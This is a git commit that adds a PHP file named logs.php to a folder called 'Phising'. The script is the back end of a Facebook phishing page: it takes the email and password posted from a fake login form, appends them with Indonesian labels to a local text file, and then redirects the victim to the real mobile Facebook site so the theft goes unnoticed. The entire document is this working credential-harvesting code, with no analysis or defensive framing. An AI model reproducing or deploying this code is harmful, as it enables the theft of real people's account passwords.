aebe135bed9bc361e6d4bc126655dd71d9beb843
siculay1 <100817044+siculay1@users.noreply.github.com>
2022-03-03 10:23:17 +0800

    Add files via upload

---
+++ Phising/logs.php
@@ -0,0 +1,19 @@
+<?php
+header ("Location: http://m.facebook.com");
+$ADEx = "ina.txt";
+$ADEy = $_POST['email'];
+$ADEz = $_POST['pass'];
+$handle = fopen($ADEx, 'a');
+fwrite($handle, "++++++++++++++++++++++++++++++++");
+fwrite($handle, "\n");
+fwrite($handle, "Email atau Telepon : ");
+fwrite($handle, "$ADEy");
+fwrite($handle, "\n");
+fwrite($handle, "Kata Sandi         : ");
+fwrite($handle, "$ADEz");
+fwrite($handle, "\n");
+fwrite($handle, "++++++++++++++++++++++++++++++++");
+fwrite($handle, "\n");
+fclose($handle);
+exit;
+?>
